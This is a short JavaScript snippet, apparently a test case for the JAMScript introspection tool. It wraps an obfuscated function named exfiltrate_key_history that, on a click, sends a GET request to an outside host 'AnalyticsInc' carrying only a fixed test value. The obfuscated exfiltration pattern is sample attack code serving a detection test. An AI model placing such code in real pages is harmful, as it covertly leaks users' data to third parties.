introspect(JAMScript.introspectors.processAll) {
function exfiltrate_key_history() {
  var _0x2e14 = ["GET", "http://AnalyticsInc:8000/submission.html?", "test=java_obfuscator", "open", "send"];
  xmlhttp = new XMLHttpRequest;
  xmlhttp[_0x2e14[3]](_0x2e14[0], _0x2e14[1] + _0x2e14[2], true);
  xmlhttp[_0x2e14[4]](null)
}
document.getElementById("test").onclick = exfiltrate_key_history;

}
